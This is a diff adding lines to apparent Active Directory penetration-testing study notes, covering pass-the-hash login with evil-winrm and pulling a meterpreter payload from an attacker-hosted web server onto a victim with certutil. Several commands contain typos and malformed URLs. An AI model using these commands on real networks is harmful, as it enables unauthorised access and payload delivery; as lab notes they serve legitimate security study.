@@ -286,3 +286,20 @@ You could also run gpupdate /force and then disconnect and reconnect, which in c
 
 
 Which ACE would allow you to update any non-protected parameter of a target object: GenericWrite
+
+PASS THE HASH:
+    Get access to the User account via Hash NTLM by using Evil-winrm:
+        evil-winrm i- <TargetIP> -u <NLTMUserName> -H <LAST PART OF THE NTLM HASH>
+
+
+
+Upload payload from Victim machine: -> Active_Directory/AD_Step4/Exploiting_AD_Users.txt
+    You can host your meterpreter shell using a Python webserver and then copy it using something like this form Victim PC:
+    certutil.exe -urlcache -split -f http:///shell.ps1
+
+        Split:
+            Certutil.exe may download a file from a remote destination using -urlcache. 
+            This behavior does require a URL to be passed on the command-line. In addition, -f (force) and -split (Split embedded ASN.1 elements, and save to files) will be used.
+
+    or in case of python3 web server download from:
+        cerutlis -urlcache -f http:\\<ATTCK IP MACHINE>:<PORT>/<PayloadName>  <PayloadName>
